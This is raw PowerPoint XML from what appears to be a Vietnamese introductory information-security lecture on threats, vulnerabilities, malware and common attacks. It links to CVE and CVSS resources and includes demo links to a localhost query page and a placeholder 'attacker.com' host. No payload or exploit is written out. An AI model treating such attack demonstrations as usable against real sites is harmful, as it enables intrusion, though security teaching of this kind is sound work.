      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Date Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1320800" y="6680200"/>
            <a:ext cx="914400" cy="101600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="800"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{DAED42B9-A9B3-4C90-9AB2-76E611252691}" type="datetime1">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>8/30/2018</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9347200" y="6542619"/>
            <a:ext cx="2844800" cy="366183"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1000"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{3459EEF1-0BBF-40BA-A883-A13E8F82AB0A}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Footer Placeholder 8"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5588000" y="6631517"/>
            <a:ext cx="1219200" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="700"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Mohan Kamat</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3682290041"/>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8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4993083"/>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27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220429889"/>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7907E4F-3FBA-3F49-8ED1-FFEDFAC8B7F4}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId18">
            <a:alphaModFix amt="5000"/>
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3533727" y="1988654"/>
            <a:ext cx="5003800" cy="4025900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2"/>
            <a:ext cx="12192000" cy="1404257"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C00000"/>
          </a:solidFill>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sz="2250" dirty="0">
              <a:latin typeface="Times New Roman" charset="0"/>
              <a:ea typeface="Times New Roman" charset="0"/>
              <a:cs typeface="Times New Roman" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8"/>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46495" y="115250"/>
            <a:ext cx="1168989" cy="1159328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:outerShdw blurRad="50800" dist="38100" dir="8100000" algn="tr" rotWithShape="0">
              <a:prstClr val="black">
                <a:alpha val="40000"/>
              </a:prstClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6564086"/>
            <a:ext cx="12192000" cy="293914"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C00000"/>
          </a:solidFill>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sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10751936" y="5683175"/>
            <a:ext cx="707333" cy="1159329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C00000"/>
          </a:solidFill>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477297535"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk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 id="2147483727" r:id="rId12"/>
    <p:sldLayoutId id="2147483728" r:id="rId13"/>
    <p:sldLayoutId id="2147483712" r:id="rId14"/>
    <p:sldLayoutId id="2147483713" r:id="rId15"/>
    <p:sldLayoutId id="2147483714" r:id="rId16"/>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3.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image9.gif"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="Vulnerability/2011_cwe_sans_top25.pdf" TargetMode="External"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide29.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.mitre.org/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cvedetails.com/top-50-products.php?year=2017" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide12.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cvedetails.com/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/vuln/search?execution=e3s1" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/CERT_Coordination_Center" TargetMode="External"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide30.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.first.org/cvss/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?calculator&amp;adv&amp;version=2#score" TargetMode="External"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide31.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="Vulnerability/cvss-v30-examples_v1.5.pdf" TargetMode="External"/><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13.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image17.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7.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1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5.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide9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5.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide9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5.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide9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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide9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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide9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8.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1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9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3.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8.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/diagramLayout" Target="../diagrams/layout5.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image34.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/diagramData" Target="../diagrams/data5.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide104.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:6996/KhachHang.aspx?Show" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:6996/KhachHang.aspx?Show=User" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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3.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide11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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide11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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide117.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49.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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13.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3.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3.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5.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://website/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide12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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide12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3.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9.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13.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide13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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide13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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide13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1.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide13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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide13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3.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide13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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide139.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3.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2.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3.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4.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.attacker.com/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide14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13.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide148.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54.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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4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55.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide151.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57.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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5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58.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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13.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3.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide157.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61.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide15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62.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide16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64.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide161.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65.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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16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66.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide163.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67.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide16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69.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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7.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3.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3.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3.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide171.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image66.jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide172.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73.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide17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74.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout6.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3.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide178.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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide179.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3.xml"/></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3.xml"/></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3.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide182.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13.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83.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image69.jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide184.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hyperlink" Target="http://nghiencuuquocte.org/2014/03/11/stuxnet-chien-tranh-mang/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image72.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image71.jpeg"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide185.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485901" y="3047774"/>
            <a:ext cx="9143999" cy="838200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>BÀI 2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>: NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t> GÂY </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>MẤT AN TOÀN THÔNG TIN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 30" descr="elearning-graphic[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8200" y="3581400"/>
            <a:ext cx="2819400" cy="277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AutoShape 41"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1485900" y="1676400"/>
            <a:ext cx="9144000" cy="1227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ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr"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mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr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2pPr>
            <a:lvl3pPr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3pPr>
            <a:lvl4pPr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4pPr>
            <a:lvl5pPr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5pPr>
            <a:lvl6pPr marL="457200"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6pPr>
            <a:lvl7pPr marL="914400"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7pPr>
            <a:lvl8pPr marL="1371600"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8pPr>
            <a:lvl9pPr marL="1828800"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9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent6"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>BÀI GIẢNG </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent6"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="4600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent6"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CƠ SỞ AN TOÀN THÔNG TIN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18421613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5" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114691" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. TỔNG QUAN NGUY CƠ GÂY MẤT AN TOÀN THÔNG TIN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="CC0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. LỖ HỔNG BẢO MẬT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>III</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. MÃ ĐỘC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. MỘT SỐ KIỂU TẤN CÔNG PHỔ BIẾN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>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4691">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11469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469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4691">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11469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1469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4691">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11469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469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14691">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="114691">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14691">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1"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p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t>I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t>. TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3600"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="542723" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1828800"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1"/>
              <a:t>1. Khái niệm cơ bản</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800"/>
              <a:t> Nguy cơ (Hiểm họa, mối đe dọa)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800"/>
              <a:t> Rủi ro</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800"/>
              <a:t> Lỗ hổng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800"/>
              <a:t> Mã độc</a:t>
            </a:r>
          </a:p>
